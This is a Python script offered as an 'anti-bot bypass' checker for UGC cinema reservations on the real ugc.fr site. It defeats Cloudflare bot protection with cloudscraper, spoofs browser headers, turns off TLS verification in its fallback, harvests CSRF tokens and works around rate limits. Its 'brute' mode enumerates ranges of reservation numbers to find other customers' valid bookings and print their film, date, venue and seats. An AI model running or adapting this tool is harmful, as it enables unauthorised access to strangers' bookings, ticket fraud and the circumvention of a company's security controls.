#!/usr/bin/env python3
"""
UGC e-billet checker — anti-bot bypass edition
Vérifie la validité d'une réservation UGC

pip install requests beautifulsoup4 cloudscraper
Usage: python ugc_checker.py <numero_reservation>
       python ugc_checker.py 33500063B071466134
       python ugc_checker.py brute 335000 1000000 1001000
"""

import sys, re, json, time, random
from bs4 import BeautifulSoup

import warnings
warnings.filterwarnings("ignore")

try:
    import cloudscraper
    _scraper = cloudscraper.create_scraper(
        browser={"browser": "chrome", "platform": "windows", "mobile": False}
    )
    SESS = _scraper
    print("[*] cloudscraper loaded (Cloudflare bypass active)")
except ImportError:
    import requests
    requests.packages.urllib3.disable_warnings()
    SESS = requests.Session()
    SESS.verify = False
    print("[!] cloudscraper not installed — fallback to requests (pip install cloudscraper)")

SESS.headers.update({
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "Chrome/124.0.0.0 Safari/537.36",
    "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer":         "https://www.ugc.fr/",
    "Origin":          "https://www.ugc.fr",
    "Connection":      "keep-alive",
})

BASE_URL = "https://www.ugc.fr/reservation/retrieveBooking.html"

def get_csrf_token(html: str) -> str | None:
    """Parse le CSRF token caché dans le form HTML."""
    soup = BeautifulSoup(html, "html.parser")
    # cas 1 — input hidden classique
    for name in ["_csrf", "csrfToken", "csrf_token", "token", "_token", "authenticity_token"]:
        el = soup.find("input", {"name": name})
        if el:
            return name, el.get("value", "")
    # cas 2 — meta tag
    meta = soup.find("meta", {"name": re.compile(r"csrf", re.I)})
    if meta:
        return "csrfToken", meta.get("content", "")
    # cas 3 — hidden input quelconque avec "token" dans le name
    for el in soup.find_all("input", {"type": "hidden"}):
        nm = el.get("name", "")
        if "token" in nm.lower():
            return nm, el.get("value", "")
    return None, None

def smart_request(method: str, url: str, retries=3, **kwargs):
    """Request avec retry + backoff sur 429/503."""
    for attempt in range(retries):
        try:
            fn = SESS.get if method == "GET" else SESS.post
            r  = fn(url, timeout=12, **kwargs)
            if r.status_code == 429:
                wait = int(r.headers.get("Retry-After", 5)) + random.randint(1, 3)
                print(f"  [!] Rate limited — waiting {wait}s...")
                time.sleep(wait)
                continue
            if r.status_code == 503:
                time.sleep(2 ** attempt)
                continue
            return r
        except Exception as e:
            if attempt == retries - 1:
                raise
            time.sleep(1.5 ** attempt)
    return None

def check_ugc(reservation_number: str):
    reservation_number = reservation_number.strip().upper()
    print(f"\n[*] Checking UGC reservation: {reservation_number}")
    print("─" * 50)

    ERROR_KW   = ["introuvable","invalid","not found","aucune","incorrect","erreur","numéro de réservation"]
    SUCCESS_KW = ["séance","votre billet","votre réservation","film","salle","places","montant"]

    try:
        # Étape 1 — GET pour récupérer cookies + CSRF token
        r1 = smart_request("GET", BASE_URL)
        if not r1:
            print("  [!] GET failed"); return
        print(f"  [GET]  {BASE_URL} → {r1.status_code}")

        csrf_name, csrf_val = get_csrf_token(r1.text)
        if csrf_name:
            print(f"  [CSRF] found: {csrf_name} = {csrf_val[:12]}...")
        else:
            print("  [CSRF] none found (form may not need it)")

        # Étape 2 — POST avec le numéro + CSRF si présent
        payload = {"bookingNumber": reservation_number, "retrieveBooking": "true"}
        if csrf_name and csrf_val:
            payload[csrf_name] = csrf_val

        r2 = smart_request("POST", BASE_URL, data=payload, allow_redirects=True)
        if not r2:
            print("  [!] POST failed"); return
        print(f"  [POST] {BASE_URL} → {r2.status_code}")

        body = r2.text.lower()
        soup = BeautifulSoup(r2.text, "html.parser")

        if any(k in body for k in ERROR_KW):
            print(f"\n  ❌ INVALID — réservation non trouvée")
        elif any(k in body for k in SUCCESS_KW):
            print(f"\n  ✅ VALID — réservation trouvée !")
            for cls_pat, label in [
                (r"film|movie|title", "FILM"),
                (r"date|seance|session|showtime", "DATE"),
                (r"cinema|theater|venue|lieu", "LIEU"),
                (r"place|seat|ticket", "PLACES"),
            ]:
                el = soup.find(class_=re.compile(cls_pat, re.I))
                if el:
                    print(f"  [{label}] {el.get_text(strip=True)[:80]}")
            title = soup.find("title")
            if title:
                print(f"  [PAGE] {title.get_text(strip=True)}")
        else:
            print(f"\n  [?] Réponse ambiguë (HTTP {r2.status_code}) — dump partiel:")
            texts = [t.strip() for t in soup.stripped_strings if len(t.strip()) > 20][:10]
            for t in texts:
                print(f"      {t}")

        # Étape 3 — tentative API JSON (pas toujours dispo)
        try:
            r3 = SESS.get(
                f"https://www.ugc.fr/api/booking/{reservation_number}",
                headers={"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"},
                timeout=8
            )
            print(f"  [API]  /api/booking/ → {r3.status_code}")
            if r3.status_code == 200:
                try:
                    d = r3.json()
                    print(f"  [JSON] {json.dumps(d, indent=2, ensure_ascii=False)[:400]}")
                except Exception:
                    pass
        except Exception:
            pass

    except Exception as e:
        print(f"  [!] Error: {e}")

def brute_check(prefix: str, start: int, end: int):
    """
    Brute-force une plage de numéros de réservation
    ex: brute_check("335000", 1000000, 1001000)
    """
    print(f"\n[*] Brute forcing {prefix}{start} → {prefix}{end}")
    valid = []
    for i in range(start, end):
        num = f"{prefix}{i}"
        # requête rapide HEAD pour tester
        try:
            r = smart_request(
                "POST", BASE_URL,
                data={"bookingNumber": num, "retrieveBooking": "true"},
                allow_redirects=True,
            )
            body = r.text.lower()
            if any(x in body for x in ["film","séance","salle","votre réservation"]):
                print(f"  ✅ VALID: {num}")
                valid.append(num)
            else:
                print(f"  ✗ {num}", end="\r")
        except Exception:
            pass
    print(f"\n[*] Found {len(valid)} valid reservation(s)")
    return valid

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python ugc_checker.py <reservation_number>")
        print("       python ugc_checker.py 33500063B071466134")
        print("\nBrute force mode:")
        print("       python ugc_checker.py brute <prefix> <start> <end>")
        print("       python ugc_checker.py brute 335000 1000000 1001000")
        sys.exit(1)

    if sys.argv[1].lower() == "brute":
        prefix = sys.argv[2] if len(sys.argv) > 2 else "335000"
        start  = int(sys.argv[3]) if len(sys.argv) > 3 else 1000000
        end    = int(sys.argv[4]) if len(sys.argv) > 4 else 1000100
        brute_check(prefix, start, end)
    else:
        check_ugc(sys.argv[1])
